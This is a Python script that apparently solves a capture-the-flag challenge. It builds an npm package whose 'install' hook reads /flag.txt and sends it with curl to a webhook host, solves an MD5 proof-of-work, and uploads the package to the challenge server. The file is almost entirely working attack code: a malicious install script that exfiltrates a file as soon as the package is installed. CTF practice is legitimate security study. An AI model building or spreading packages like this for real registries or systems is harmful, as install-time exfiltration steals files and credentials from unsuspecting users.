import hashlib
import itertools
import requests
import tarfile
import os

def create_tgz(package_dir, output_filename):
    with tarfile.open(output_filename, "w:gz") as tar:
        tar.add(package_dir, arcname=os.path.basename(package_dir))

def solve_pow(challenge):
    for i in itertools.count():
        candidate = challenge + str(i)
        hash_result = hashlib.md5(candidate.encode()).hexdigest()
        if hash_result.startswith('00000'):
            return str(i)

def main():
    package_dir = 'flag_package'
    if not os.path.exists(package_dir):
        os.makedirs(package_dir)
        with open(os.path.join(package_dir, 'package.json'), 'w') as f:
            f.write('''
{
  "name": "flag",
  "version": "1.0.0",
  "scripts": {
    "install": "cat /flag.txt > /tmp/flag && curl https://webhook/flag=$(cat /tmp/flag)"
  }
}
            ''')
        with open(os.path.join(package_dir, 'index.js'), 'w') as f:
            f.write('// 1')

    tgz_file = 'flag-1.0.0.tgz'
    create_tgz(package_dir, tgz_file)

    url = 'http://tap2work.tasks.2025.ctf.cs.msu.ru/'
    session = requests.Session()

    response = session.get(url)
    challenge = session.cookies.get('challenge')

    pow_response = solve_pow(challenge)

    files = {
        'module': (tgz_file, open(tgz_file, 'rb'), 'application/gzip')
    }

    data = {
        'response': pow_response
    }

    session.post(url, files=files, data=data)

if __name__ == '__main__':
    main()